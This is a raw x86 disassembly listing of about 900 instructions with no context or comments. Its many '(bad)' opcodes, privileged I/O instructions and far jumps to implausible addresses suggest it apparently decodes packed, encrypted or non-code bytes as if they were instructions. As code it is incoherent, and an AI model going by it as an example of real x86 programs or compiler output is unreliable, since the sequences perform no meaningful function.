  412d9f:	ins    DWORD PTR es:[edi],dx
  412da0:	push   ebx
  412da1:	outs   dx,BYTE PTR ds:[esi]
  412da2:	dec    esp
  412da3:	sbb    dh,BYTE PTR [esp+edi*4]
  412da6:	call   0x1b6c:0x18e449a2
  412dad:	mov    ecx,0xa3b21b89
  412db2:	hlt    
  412db3:	cmp    ebp,ebp
  412db5:	pop    ss
  412db6:	lock and DWORD PTR [edx-0x49],edi
  412dba:	mov    dh,0xf8
  412dbc:	lds    ecx,FWORD PTR [ecx+eiz*2-0x6e]
  412dc0:	ffree  st(6)
  412dc2:	add    DWORD PTR [ebx+0x4f17bd16],eax
  412dc8:	and    al,ch
  412dca:	xlat   BYTE PTR ds:[ebx]
  412dcb:	sbb    ch,BYTE PTR [ecx+0x2b279d2f]
  412dd1:	cmp    ebx,edi
  412dd3:	sub    bh,BYTE PTR [esi]
  412dd5:	fs ja  0x412e09
  412dd8:	mov    ch,0xe1
  412dda:	sbb    BYTE PTR [ecx+0x44e9b042],bl
  412de0:	jnp    0x412d69
  412de2:	out    dx,eax
  412de3:	dec    edi
  412de4:	inc    eax
  412de5:	mov    ch,0xc7
  412de7:	mov    edi,0x66ed96d1
  412dec:	scas   al,BYTE PTR es:[edi]
  412ded:	adc    edx,DWORD PTR [ecx+0x73]
  412df0:	or     bl,bh
  412df2:	dec    esp
  412df3:	shl    BYTE PTR [ebx+0x11],1
  412df6:	out    0x74,al
  412df8:	mov    al,0xa8
  412dfa:	mov    al,BYTE PTR [ecx]
  412dfc:	fmul   QWORD PTR [edx]
  412dfe:	add    eax,0x41bf2ebd
  412e03:	sar    DWORD PTR [ecx],cl
  412e05:	outs   dx,DWORD PTR ds:[esi]
  412e06:	fstp   TBYTE PTR [ebp-0x74]
  412e09:	(bad)  
  412e0b:	arpl   WORD PTR [eax],bp
  412e0d:	inc    esi
  412e0e:	sub    eax,0x23a165ce
  412e13:	push   es
  412e14:	mov    ebx,0x63c9c396
  412e19:	mov    ch,al
  412e1b:	(bad)  
  412e1c:	iret   
  412e1d:	jb     0x412e9c
  412e1f:	xchg   esp,eax
  412e20:	cwde   
  412e21:	add    DWORD PTR [ebp+0x2b],esi
  412e24:	icebp  
  412e25:	dec    esi
  412e26:	cmp    ch,bh
  412e28:	sub    ch,BYTE PTR ds:0x4a551b4f
  412e2e:	(bad)  
  412e30:	loope  0x412e02
  412e32:	or     al,0x1b
  412e34:	pop    esi
  412e35:	push   esp
  412e36:	cli    
  412e37:	adc    ebx,esi
  412e39:	pop    ss
  412e3a:	dec    esp
  412e3b:	sysenter 
  412e3d:	sahf   
  412e3e:	daa    
  412e3f:	es popa 
  412e41:	inc    ebp
  412e42:	pop    ds
  412e43:	mov    ebp,0xc18ad922
  412e48:	arpl   sp,cx
  412e4a:	lea    eax,[ecx-0x38]
  412e4d:	adc    eax,DWORD PTR [eax+0x278ac077]
  412e53:	into   
  412e54:	mov    dl,0xce
  412e56:	les    ebp,FWORD PTR [edi]
  412e58:	out    dx,al
  412e59:	clc    
  412e5a:	hlt    
  412e5b:	gs test eax,0xfc5d633a
  412e61:	dec    eax
  412e62:	adc    BYTE PTR [ecx+ecx*1],dh
  412e65:	pop    ebx
  412e66:	div    DWORD PTR [edx+0x4d]
  412e69:	and    BYTE PTR [edi],bh
  412e6b:	repnz mov cl,0x2d
  412e6e:	or     BYTE PTR [ebx-0x2e],0x59
  412e72:	sbb    DWORD PTR [ebx+0x6717842b],edi
  412e78:	jle    0x412edd
  412e7a:	pop    esp
  412e7b:	push   ss
  412e7c:	outs   dx,DWORD PTR ds:[esi]
  412e7d:	mov    ah,0xb7
  412e7f:	xchg   BYTE PTR [edx-0x5b],cl
  412e82:	or     DWORD PTR [ebx],ebp
  412e84:	loop   0x412ed9
  412e86:	dec    ebx
  412e87:	inc    edx
  412e88:	dec    ebx
  412e89:	(bad)  
  412e8a:	retf   
  412e8b:	inc    ch
  412e8d:	addr16 in al,0x4f
  412e90:	call   0x649450a7
  412e95:	outs   dx,BYTE PTR ds:[esi]
  412e96:	sub    DWORD PTR [ebx-0x597e28f1],esp
  412e9c:	test   al,0x91
  412e9e:	out    dx,eax
  412e9f:	sub    BYTE PTR [ebp-0x62a77223],ch
  412ea5:	(bad)  
  412ea6:	jmp    0x2221f90a
  412eab:	or     al,0x3
  412ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eae:	inc    esp
  412eaf:	push   es
  412eb0:	data16 jge 0x412ee6
  412eb3:	xor    eax,0xbf51c430
  412eb8:	cmp    DWORD PTR [edi+eiz*4-0x3e2dd6ef],ebx
  412ebf:	inc    ebp
  412ec0:	int    0xc
  412ec2:	xchg   esp,eax
  412ec3:	push   ss
  412ec4:	or     esp,DWORD PTR [eax+0x23]
  412ec7:	sbb    al,0x1f
  412ec9:	jmp    0x412e77
  412ecb:	retf   0x740a
  412ece:	fnstenv [ebp-0xf]
  412ed1:	pop    esp
  412ed2:	es aam 0x2a
  412ed5:	and    dl,ch
  412ed7:	sar    BYTE PTR [edx+0x1ee58e8],0x20
  412ede:	dec    edx
  412edf:	mov    al,gs:0x4df4d6d
  412ee5:	add    esi,DWORD PTR [ecx+0x4302626e]
  412eeb:	neg    DWORD PTR [ecx-0x63]
  412eee:	test   BYTE PTR [eax],0xa7
  412ef1:	lea    ecx,[edx+0x4d6547f7]
  412ef7:	or     esi,DWORD PTR [eax-0x27]
  412efa:	mov    eax,ds:0xfcad634f
  412eff:	jmp    0x412eaa
  412f01:	outs   dx,DWORD PTR ds:[esi]
  412f02:	pop    ebx
  412f03:	pop    edi
  412f04:	dec    eax
  412f05:	mov    eax,0x8ffeb91b
  412f0a:	leave  
  412f0b:	xor    BYTE PTR [edx],0xba
  412f0e:	fwait
  412f0f:	mov    ah,0x99
  412f11:	shl    DWORD PTR [esi],0xb3
  412f14:	cmp    eax,0xaff222e7
  412f19:	jmp    0x412f8a
  412f1b:	sub    edx,DWORD PTR [esi+0x50]
  412f1e:	push   cs
  412f1f:	inc    edx
  412f20:	retf   
  412f21:	push   eax
  412f22:	xchg   DWORD PTR ds:0xab1c6b28,ecx
  412f28:	ror    BYTE PTR [eax],cl
  412f2a:	mov    ds:0x33bd51eb,eax
  412f2f:	and    DWORD PTR [eax],0x4f
  412f32:	xlat   BYTE PTR ds:[ebx]
  412f33:	out    0x7a,al
  412f35:	mov    dl,0xa
  412f37:	das    
  412f38:	fdiv   DWORD PTR [ebx+0x496e6245]
  412f3e:	dec    edx
  412f3f:	xchg   ebp,eax
  412f40:	ds fmul st(7),st
  412f43:	mov    esi,0x51d983b7
  412f48:	dec    edi
  412f49:	add    DWORD PTR [eax+ebx*1+0x76247021],edi
  412f50:	mov    bl,0xda
  412f52:	inc    eax
  412f53:	push   ds
  412f54:	xor    DWORD PTR cs:[ebx-0x1c14ad31],ebx
  412f5b:	jle    0x412f80
  412f5d:	pop    ebx
  412f5e:	jg     0x412fbb
  412f60:	pop    esp
  412f61:	push   es
  412f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f63:	inc    ebp
  412f64:	pxor   mm4,mm3
  412f67:	jmp    0x3f61:0xd5e0bb14
  412f6e:	jnp    0x412f80
  412f70:	mov    ecx,0xb36a2a0e
  412f75:	cdq    
  412f76:	mov    ebp,DWORD PTR [edi+edi*4+0x3d6ac553]
  412f7d:	leave  
  412f7e:	retf   0x6802
  412f81:	push   ebx
  412f82:	dec    ebp
  412f83:	dec    ebx
  412f84:	scas   eax,DWORD PTR es:[edi]
  412f85:	adc    BYTE PTR [eax+eiz*1],0xa1
  412f89:	sbb    eax,0x5e7a5c80
  412f8e:	add    edx,DWORD PTR [edx+0x17]
  412f91:	bound  esp,QWORD PTR [edi]
  412f93:	addr16 inc ecx
  412f95:	mov    DWORD PTR [edx-0x53],edx
  412f98:	xor    dh,BYTE PTR [ebx]
  412f9a:	push   edi
  412f9b:	(bad)  
  412f9c:	imul   esp,ecx,0xfffffff0
  412f9f:	lock adc al,0x77
  412fa2:	xlat   BYTE PTR ds:[ebx]
  412fa3:	aam    0x7e
  412fa5:	cwde   
  412fa6:	into   
  412fa7:	mov    edi,0x18f0436d
  412fac:	fidivr WORD PTR [eax]
  412fae:	mov    ds:0xa1a201a8,al
  412fb3:	idiv   DWORD PTR [ecx-0x54]
  412fb6:	push   ds
  412fb7:	adc    DWORD PTR [ebx+0x64],ecx
  412fba:	xchg   ecx,eax
  412fbb:	sub    DWORD PTR ds:0x4b764f0a,ebp
  412fc1:	in     al,0x3b
  412fc3:	retf   
  412fc4:	add    al,0x2f
  412fc6:	ds add al,0x99
  412fc9:	mov    bl,0x37
  412fcb:	jecxz  0x412f91
  412fcd:	popa   
  412fce:	mov    ecx,0xe0925a0a
  412fd3:	xor    ebp,DWORD PTR [ecx]
  412fd5:	dec    ebx
  412fd6:	iret   
  412fd7:	sub    BYTE PTR ds:[ebp+0x2e77f6e6],0x67
  412fdf:	dec    ebx
  412fe0:	sbb    al,0x8d
  412fe2:	mov    ecx,esp
  412fe4:	xchg   DWORD PTR [ecx],esp
  412fe6:	pop    ebp
  412fe7:	mov    dl,0x4d
  412fe9:	and    ecx,DWORD PTR [ecx-0x627e74ff]
  412fef:	rcr    DWORD PTR [ecx+ebx*8-0xf],cl
  412ff3:	xchg   edi,eax
  412ff4:	ror    DWORD PTR [ecx],1
  412ff6:	push   eax
  412ff7:	jmp    0x413016
  412ff9:	jge    0x413079
  412ffb:	push   0xffffffd7
  412ffd:	dec    edx
  412ffe:	cs (bad) 
  413000:	adc    cl,bh
  413002:	test   BYTE PTR [ecx-0x7a],0x7a
  413006:	add    al,0x1
  413008:	jp     0x41301c
  41300a:	out    0xa1,al
  41300c:	stc    
  41300d:	fsub   DWORD PTR [eax]
  41300f:	mov    eax,ss:0x1e40c717
  413015:	mov    cl,0xba
  413017:	iret   
  413018:	mov    eax,0x308916f7
  41301d:	loope  0x412fe0
  41301f:	sub    eax,0x659596e2
  413024:	cwde   
  413025:	add    al,0xa4
  413027:	pop    edx
  413028:	fcmovnb st,st(7)
  41302a:	in     eax,0xa4
  41302c:	dec    ecx
  41302d:	adc    eax,0x6bbcc9a7
  413032:	or     eax,0x6b3e15a4
  413037:	cmp    dh,BYTE PTR [eax+0xf59be64]
  41303d:	test   eax,0x88c8d412
  413042:	rcl    al,cl
  413044:	cdq    
  413045:	imul   DWORD PTR [edx+ebp*4+0x74]
  413049:	xchg   ebx,eax
  41304a:	in     eax,0xc9
  41304c:	mov    bl,0x14
  41304e:	icebp  
  41304f:	inc    eax
  413050:	sub    dh,BYTE PTR [ebp-0x7a]
  413053:	pop    eax
  413054:	cld    
  413055:	fsubr  DWORD PTR [ebp+edi*2+0x5a66584b]
  41305c:	add    al,0x7a
  41305e:	pop    edx
  41305f:	sahf   
  413060:	dec    edi
  413061:	cdq    
  413062:	fwait
  413063:	push   0xc32277a7
  413068:	or     esp,edx
  41306a:	into   
  41306b:	sbb    BYTE PTR [ecx],ch
  41306d:	xor    bh,BYTE PTR [ebx-0x6fcdb87d]
  413073:	inc    esp
  413074:	enter  0xb17a,0x1c
  413078:	pusha  
  413079:	enter  0x35d2,0x78
  41307d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307e:	fdiv   st(0),st
  413080:	sbb    esi,DWORD PTR [ecx-0x53]
  413083:	fcmovu st,st(2)
  413085:	adc    al,0x1b
  413087:	dec    ebp
  413088:	xor    BYTE PTR [edi+eax*2-0x3f1167b6],ah
  41308f:	out    dx,al
  413090:	lock loopne 0x413030
  413093:	in     al,dx
  413094:	mov    ecx,0xa816da58
  413099:	sbb    eax,0x35588035
  41309e:	sbb    BYTE PTR [eax+0x49],bl
  4130a1:	add    edi,edi
  4130a3:	in     eax,0xff
  4130a5:	idiv   BYTE PTR [ecx-0x6]
  4130a8:	daa    
  4130a9:	shl    DWORD PTR [ecx+0x15f3f5b6],cl
  4130af:	dec    ebx
  4130b0:	jge    0x4130be
  4130b2:	inc    esp
  4130b3:	mov    cl,BYTE PTR [ebx-0x77]
  4130b6:	add    dl,dl
  4130b8:	sbb    edi,DWORD PTR [ebp-0x2dbb7b4c]
  4130be:	sbb    edi,DWORD PTR [ecx]
  4130c0:	cmp    BYTE PTR [eax-0x4c],cl
  4130c3:	pop    DWORD PTR [ebx*2-0x6ee02992]
  4130ca:	sbb    al,0x90
  4130cc:	mov    BYTE PTR [edi-0xf1cac9],bh
  4130d2:	fstp   DWORD PTR [edx+0x77287bcc]
  4130d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d9:	cs sub al,0x36
  4130dc:	push   ds
  4130dd:	mov    ah,0x37
  4130df:	sub    cl,ah
  4130e1:	test   BYTE PTR ds:0xd348b86c,ah
  4130e7:	xchg   ecx,eax
  4130e8:	mov    esp,0x69569616
  4130ed:	jecxz  0x413160
  4130ef:	xchg   esi,eax
  4130f0:	cmp    DWORD PTR [ebx+0x29],0x9a81431f
  4130f7:	mov    ah,cl
  4130f9:	add    esp,DWORD PTR [eax-0x48]
  4130fc:	sbb    DWORD PTR [ecx+eiz*8+0xf610693],esp
  413103:	(bad)  
  413105:	out    dx,eax
  413106:	mov    al,fs:0xf720575d
  41310c:	enter  0x3afd,0xf4
  413110:	fidiv  WORD PTR [ecx-0x25]
  413113:	fcom   QWORD PTR [edx-0x29]
  413116:	sbb    cl,ah
  413118:	dec    eax
  413119:	lods   al,BYTE PTR ds:[esi]
  41311a:	arpl   WORD PTR [eax+0x4b],cx
  41311d:	out    0xe4,al
  41311f:	scas   al,BYTE PTR es:[edi]
  413120:	lock call 0xa9063bc4
  413126:	mov    ebp,0x8b12b336
  41312b:	ins    BYTE PTR es:[edi],dx
  41312c:	(bad)  
  41312e:	in     eax,dx
  41312f:	out    dx,al
  413130:	xchg   esp,eax
  413131:	cwde   
  413132:	les    esp,FWORD PTR ss:[eax-0x75]
  413136:	adc    al,0xcc
  413138:	xchg   ecx,eax
  413139:	adc    DWORD PTR [edx],edx
  41313b:	loope  0x41312a
  41313d:	xor    edx,ecx
  41313f:	lds    eax,FWORD PTR [ebx+0x6a41b8ae]
  413145:	(bad)  
  413146:	pop    esp
  413147:	jne    0x4130cc
  413149:	popa   
  41314a:	pop    edi
  41314b:	enter  0xece6,0x2d
  41314f:	lods   eax,DWORD PTR ds:[esi]
  413150:	jmp    0x8aa6ed01
  413155:	icebp  
  413156:	xchg   esi,eax
  413157:	mov    edi,0x17d39359
  41315c:	scas   al,BYTE PTR es:[edi]
  41315d:	mov    DWORD PTR [esi+ebp*2+0x7c567fb5],edi
  413164:	mov    WORD PTR [esi-0x13],ss
  413167:	mov    ah,0x29
  413169:	mov    eax,DWORD PTR ds:0xf17967d3
  41316f:	sub    DWORD PTR [eax-0x6e],edi
  413172:	xor    edi,DWORD PTR [ecx+0x5]
  413175:	das    
  413176:	stos   BYTE PTR es:[edi],al
  413177:	dec    ecx
  413178:	cmp    eax,0xc34a2f47
  41317d:	iret   
  41317e:	sbb    BYTE PTR ds:0x22c0ff9c,bl
  413184:	dec    eax
  413185:	sub    DWORD PTR [eax+0xea331f0],0x24
  41318c:	sbb    bl,dl
  41318e:	dec    ebx
  41318f:	outs   dx,BYTE PTR ds:[si]
  413191:	je     0x4131b8
  413193:	lahf   
  413194:	(bad)  
  413195:	and    ebp,DWORD PTR [ecx+ebp*8]
  413198:	inc    ebp
  413199:	cwde   
  41319a:	mov    ch,0x41
  41319c:	cli    
  41319d:	das    
  41319e:	sbb    bl,BYTE PTR [esi-0x4af7a473]
  4131a4:	jae    0x4131e5
  4131a6:	neg    DWORD PTR [ebp+0x591e80cf]
  4131ac:	sar    DWORD PTR [ecx-0x540070e9],1
  4131b2:	fmul   QWORD PTR [ecx+eax*4]
  4131b5:	dec    edx
  4131b6:	push   es
  4131b7:	outs   dx,DWORD PTR ds:[esi]
  4131b8:	into   
  4131b9:	ret    0xf1ae
  4131bc:	inc    edi
  4131bd:	cld    
  4131be:	je     0xefcd7abf
  4131c4:	test   al,0xb3
  4131c6:	jp     0x4131ed
  4131c8:	retf   0x1df5
  4131cb:	or     DWORD PTR [ebx],eax
  4131cd:	ins    BYTE PTR es:[edi],dx
  4131ce:	lock int 0x62
  4131d1:	outs   dx,BYTE PTR ds:[esi]
  4131d2:	xchg   ecx,eax
  4131d3:	mov    ds:0x87ccd52e,eax
  4131d8:	ss aad 0xdf
  4131db:	retf   0xc086
  4131de:	out    dx,eax
  4131df:	mov    bh,0x11
  4131e1:	das    
  4131e2:	adc    bl,BYTE PTR [esi]
  4131e4:	mov    ds:0x9370d0ae,ax
  4131ea:	inc    ebx
  4131eb:	adc    al,0x15
  4131ed:	retf   
  4131ee:	fwait
  4131ef:	lods   eax,DWORD PTR ds:[esi]
  4131f0:	pop    ds
  4131f1:	int    0x13
  4131f3:	mov    esp,0x70e3dd40
  4131f8:	dec    edi
  4131f9:	xchg   bl,cl
  4131fb:	jecxz  0x4131c2
  4131fd:	jg     0x4131ae
  4131ff:	es and ecx,eax
  413202:	sub    BYTE PTR [ebx],ah
  413204:	mov    esp,0x80bba2e5
  413209:	in     eax,0xfe
  41320b:	mov    DWORD PTR [ebp+0x721044e7],esp
  413211:	push   esi
  413212:	bound  esp,QWORD PTR [ebx]
  413214:	lds    ebp,FWORD PTR [edi+0x12659a3f]
  41321a:	aad    0xb1
  41321c:	jge    0x413203
  41321e:	pop    edi
  41321f:	div    DWORD PTR [eax-0x5eaed144]
  413225:	pop    eax
  413226:	sbb    BYTE PTR [edi+0x7b],dh
  413229:	les    ebp,FWORD PTR [ebp-0x5d6188f7]
  41322f:	dec    DWORD PTR [edi]
  413231:	mov    al,ds:0x95d5473e
  413236:	sub    ebx,DWORD PTR [edx+0x2b23c90d]
  41323c:	sbb    al,0x83
  41323e:	or     eax,0xa037d1c3
  413243:	es dec ecx
  413245:	jmp    0x4131f5
  413247:	(bad)  
  413248:	jecxz  0x413240
  41324a:	dec    ecx
  41324b:	pop    ebx
  41324c:	int    0x74
  41324e:	inc    esi
  41324f:	cmp    BYTE PTR [ebx],0xdd
  413252:	mov    ebp,0x5f689b51
  413257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413258:	adc    al,0x6a
  41325a:	inc    esp
  41325b:	ds cli 
  41325d:	mov    ds:0x36d5b72f,al
  413262:	jno    0x413253
  413264:	adc    BYTE PTR [edi+0x72f1c90],dh
  41326a:	in     al,0x5a
  41326c:	push   es
  41326d:	mov    ds:0x9bac6e2f,eax
  413272:	and    BYTE PTR [ecx],dl
  413274:	xchg   edi,eax
  413275:	pusha  
  413276:	loop   0x413266
  413278:	ins    DWORD PTR es:[edi],dx
  413279:	mov    bh,cl
  41327b:	dec    esi
  41327c:	clc    
  41327d:	mov    ds:0xa4716ae1,al
  413282:	ja     0x41323f
  413284:	int3   
  413285:	mov    edx,0x3406777c
  41328a:	jp     0x413244
  41328c:	jo     0x41325a
  41328e:	pop    es
  41328f:	jmp    0xc272d133
  413294:	hlt    
  413295:	and    DWORD PTR [eax-0x2d121021],edi
  41329b:	ret    0xe3d0
  41329e:	mov    dh,0x7b
  4132a0:	and    BYTE PTR [ecx],ah
  4132a2:	jl     0x413294
  4132a4:	stos   DWORD PTR es:[edi],eax
  4132a5:	sbb    bl,bl
  4132a7:	pushf  
  4132a8:	call   0x2eb706e2
  4132ad:	lds    edx,FWORD PTR [ecx]
  4132af:	ret    0x25c5
  4132b2:	lea    ecx,[ecx]
  4132b4:	arpl   WORD PTR [eax+0x7347eff3],di
  4132ba:	mov    ch,0xd8
  4132bc:	jg     0x413267
  4132be:	imul   al
  4132c0:	xchg   edi,eax
  4132c1:	retf   0x2e12
  4132c4:	sbb    DWORD PTR [esi+0x7b],eax
  4132c7:	nop
  4132c8:	(bad)  
  4132c9:	popf   
  4132ca:	xchg   ebx,eax
  4132cb:	push   0xaf3ffe90
  4132d0:	sar    BYTE PTR [edi+0x78],1
  4132d3:	mov    ah,0x54
  4132d5:	sbb    BYTE PTR [edx-0x5eacf873],bh
  4132db:	sbb    ah,cl
  4132dd:	fsubr  st(2),st
  4132df:	mov    al,ds:0x3a08b914
  4132e4:	add    ecx,edi
  4132e6:	neg    BYTE PTR [ebx-0x3f452c40]
  4132ec:	xchg   edi,eax
  4132ed:	scas   eax,DWORD PTR es:[edi]
  4132ee:	mov    al,0x9f
  4132f0:	add    ch,BYTE PTR ds:0xce3fe4d4
  4132f6:	push   ebp
  4132f7:	add    BYTE PTR [esi-0x30cf1817],bh
  4132fd:	enter  0xf3e8,0x10
  413301:	enter  0x1bdf,0x9a
  413305:	add    DWORD PTR [eax-0x5c099265],esi
  41330b:	jg     0x413296
  41330d:	ret    0xdb76
  413310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413311:	test   al,0xf
  413313:	dec    edi
  413314:	mov    BYTE PTR [ebx+eax*2],cl
  413317:	dec    esp
  413318:	fwait
  413319:	stc    
  41331a:	push   esi
  41331b:	idiv   ebx
  41331d:	cmp    al,0xa5
  41331f:	mov    eax,0x3c685536
  413324:	or     ebx,DWORD PTR [ecx+0x12]
  413327:	cmp    al,0xa2
  413329:	mov    eax,DWORD PTR [ecx-0x3114bd73]
  41332f:	pop    es
  413330:	xor    BYTE PTR [eax+0x4d],bh
  413333:	sub    DWORD PTR [esi+0x6d],ecx
  413336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413337:	aas    
  413338:	js     0x4132c9
  41333a:	ror    DWORD PTR [edx+ebp*2+0x46],1
  41333e:	inc    esi
  41333f:	sub    al,0x4b
  413341:	fisubr DWORD PTR [ebp-0x2c]
  413344:	mov    edi,0xeca0cec4
  413349:	icebp  
  41334a:	cwde   
  41334b:	shl    edx,1
  41334d:	cmc    
  41334e:	pop    ecx
  41334f:	ret    
  413350:	mov    ebx,0xc4837b6e
  413355:	into   
  413356:	retf   
  413357:	(bad)  
  413358:	in     eax,dx
  413359:	loope  0x4132f9
  41335b:	and    bl,BYTE PTR ds:0xcb2d0898
  413361:	sbb    eax,ebp
  413363:	ss cld 
  413365:	cmp    esp,DWORD PTR [ecx+edx*4-0x6967904e]
  41336c:	stc    
  41336d:	inc    edx
  41336e:	aas    
  41336f:	test   eax,0x755f0df1
  413374:	jno    0x413328
  413376:	(bad)  
  413377:	push   edx
  413378:	gs xor eax,0xe6e164e4
  41337e:	push   0xffffffdb
  413380:	ret    0x8eed
  413383:	sbb    ebx,ebp
  413385:	push   ebx
  413386:	and    eax,ebx
  413388:	aaa    
  413389:	rep ins DWORD PTR es:[edi],dx
  41338b:	xor    DWORD PTR [ebx-0x30d9dc99],ebx
  413391:	mov    WORD PTR [esi-0x45],ss
  413394:	push   es
  413395:	adc    edi,0x63c47ff1
  41339b:	or     eax,0x389f7262
  4133a0:	or     BYTE PTR [esi+eiz*8+0x1959f98e],bl
  4133a7:	push   eax
  4133a8:	loopne 0x413424
  4133aa:	lea    eax,[eax]
  4133ac:	push   eax
  4133ad:	sbb    BYTE PTR [edi+0x2c],dh
  4133b0:	lea    ebx,[ebx-0x64bb09a3]
  4133b6:	jmp    0x1766d9f4
  4133bb:	repz in eax,dx
  4133bd:	iret   
  4133be:	call   0x1a46:0x4d84a0f8
  4133c5:	push   eax
  4133c6:	ret    0x116
  4133c9:	clc    
  4133ca:	jp     0x413418
  4133cc:	cli    
  4133cd:	pop    ss
  4133ce:	or     ecx,DWORD PTR [eax]
  4133d0:	push   ebp
  4133d1:	inc    esp
  4133d2:	dec    ebx
  4133d3:	fsubr  DWORD PTR [esi]
  4133d5:	dec    eax
  4133d6:	and    al,0xd1
  4133d8:	xrelease mov DWORD PTR [edx],edx
  4133db:	cli    
  4133dc:	rol    edi,0x45
  4133df:	push   ebp
  4133e0:	mov    DWORD PTR [esi+eax*1],edx
  4133e3:	test   esp,edi
  4133e5:	sub    al,al
  4133e7:	sbb    eax,0x6c6c5935
  4133ec:	add    al,0xa2
  4133ee:	jbe    0x413467
  4133f0:	add    bh,BYTE PTR [ebx+0x600a21e]
  4133f6:	sbb    eax,0x8fe28e9f
  4133fb:	dec    esi
  4133fc:	ins    DWORD PTR es:[edi],dx
  4133fd:	pop    esi
  4133fe:	sahf   
  4133ff:	mov    dl,0xfd
  413401:	mov    edx,0x8f7d5b47
  413406:	xor    BYTE PTR [eax],0xdd
  413409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41340a:	les    edx,FWORD PTR [ebx-0x72]
  41340d:	scas   eax,DWORD PTR es:[edi]
  41340e:	and    DWORD PTR [edx],edx
  413410:	mov    edx,0x6eb2666a
  413415:	ficomp DWORD PTR [eax]
  413417:	add    BYTE PTR [ebx-0x10481d83],ah
  41341d:	retf   0x6d21
  413420:	cmp    BYTE PTR [edi+0x76],0xf2
  413424:	fs inc esp
  413426:	int    0x9a
  413428:	in     eax,dx
  413429:	scas   eax,DWORD PTR es:[edi]
  41342a:	int    0x2d
  41342c:	retf   0xad8a
  41342f:	dec    eax
  413430:	nop
  413431:	call   0xfedb:0x4613fb34
  413438:	ret    
  413439:	sbb    al,BYTE PTR ds:0xa5abc682
  41343f:	adc    al,0x62
  413441:	and    al,BYTE PTR [eax+ebx*1]
  413444:	sbb    al,0x2b
  413446:	mov    DWORD PTR [ebp-0x21],edi
  413449:	out    0x6d,al
  41344b:	mov    cl,0x75
  41344d:	mov    edi,0xefb56ab9
  413452:	int    0xa5
  413454:	stos   DWORD PTR es:[edi],eax
  413455:	je     0x41348d
  413457:	adc    bl,cl
  413459:	div    ch
  41345b:	in     eax,dx
  41345c:	dec    edi
  41345d:	mov    eax,0xcbcde4f4
  413462:	shr    BYTE PTR [edx-0x14],1
  413465:	dec    ebx
  413466:	loope  0x4134cf
  413468:	mov    ds:0x19a98443,eax
  41346d:	pusha  
  41346e:	out    dx,al
  41346f:	push   edx
  413470:	push   edx
  413471:	stc    
  413472:	adc    BYTE PTR [ebx+0x72],cl
  413475:	and    DWORD PTR [eax],eax
  413477:	mov    edi,0xf41f376f
  41347c:	jge    0x41341e
  41347e:	mov    ebp,0x29a2180e
  413483:	imul   bh
  413485:	sbb    eax,0xfbe6efc
  41348a:	(bad)  
  41348b:	xchg   DWORD PTR [ebx-0x58],edi
  41348e:	jno    0x413499
  413490:	pop    ecx
  413491:	mov    edx,0x307499c4
  413496:	jne    0x413477
  413498:	mov    ebx,DWORD PTR [edx-0x5f]
  41349b:	jnp    0x413438
  41349d:	pop    edx
  41349e:	rcl    DWORD PTR [ebx],cl
  4134a0:	cmp    BYTE PTR [ebx+ebp*2-0x3a],dh
  4134a4:	mov    ebx,0xc6e1bbf4
  4134a9:	inc    esi
  4134aa:	cli    
  4134ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134ac:	imul   ecx,DWORD PTR [edi+eax*1+0x364bdd6],0x48
  4134b4:	add    DWORD PTR [eax+0x5a24dc2],ecx
  4134ba:	call   0x65db30a5
  4134bf:	add    edx,DWORD PTR [edi]
  4134c1:	pop    esi
  4134c2:	add    al,0x93
  4134c4:	call   0x8620:0x58ccfc0e
  4134cb:	je     0x413493
  4134cd:	fsub   DWORD PTR [ebx-0x16]
  4134d0:	xor    DWORD PTR [edx+0x4e],ebp
  4134d3:	idiv   DWORD PTR [edx]
  4134d5:	aad    0xeb
  4134d7:	mov    edx,0xf613fc6d
  4134dc:	les    edx,FWORD PTR [eiz*8-0x3132972b]
  4134e3:	(bad)  
  4134e4:	and    BYTE PTR [ebp+ebx*4-0x477cd407],bh
  4134eb:	sti    
  4134ec:	sub    dl,BYTE PTR [ebp+ebp*4+0x20b9f55c]
  4134f3:	xchg   edi,eax
  4134f4:	push   esp
  4134f5:	fidiv  DWORD PTR [esi+0x44]
  4134f8:	pop    ss
  4134f9:	cdq    
  4134fa:	je     0x413549
  4134fc:	mov    eax,0x457f1275
  413501:	test   eax,0x5314e1f0
  413506:	mov    dh,0x26
  413508:	mov    ds,WORD PTR [eax]
  41350a:	ds xchg ecx,eax
  41350c:	xchg   ebp,eax
  41350d:	clc    
  41350e:	pop    eax
  41350f:	aaa    
  413510:	jmp    0x4134c3
  413512:	push   ss
  413513:	js     0x4134f9
  413515:	aas    
  413516:	retf   0xc3b4
  413519:	lock (bad) 
  41351b:	push   eax
  41351c:	xor    DWORD PTR [eax+0x44],ebp
  41351f:	call   0x36b8a1d0
  413524:	shl    DWORD PTR [edi-0x32],0x95
  413528:	stos   DWORD PTR es:[edi],eax
  413529:	push   esi
  41352a:	(bad)  
  41352b:	out    dx,eax
  41352c:	addr16 push ebp
  41352e:	enter  0xa15f,0x8b
  413532:	lods   al,BYTE PTR ds:[esi]
  413533:	in     al,0x36
  413535:	(bad)  
  413536:	pop    esi
  413537:	xchg   edx,eax
  413538:	pushf  
  413539:	pushf  
  41353a:	sub    BYTE PTR [edx-0x7526e360],bh
  413540:	jp     0x4135a8
  413542:	add    al,BYTE PTR [edx]
  413544:	xchg   DWORD PTR [esi-0x7a532133],ecx
  41354a:	lods   eax,DWORD PTR ds:[esi]
  41354b:	gs xchg edi,eax
  41354d:	cld    
  41354e:	mov    cl,0x6c
  413550:	aad    0x6c
  413552:	mov    al,0x8f
  413554:	and    eax,DWORD PTR [eax-0x6223bd68]
  41355a:	shl    DWORD PTR [esi-0x22],cl
  41355d:	or     BYTE PTR [eax],bl
  41355f:	xchg   edx,eax
  413560:	stos   BYTE PTR es:[edi],al
  413561:	shl    DWORD PTR [ebx],0x73
  413564:	or     DWORD PTR [edx-0x43],eax
  413567:	or     eax,0x358b3b9
  41356c:	xchg   BYTE PTR [edx],al
  41356e:	nop
  41356f:	cmp    DWORD PTR [ebp+0x4977afa3],esi
  413575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
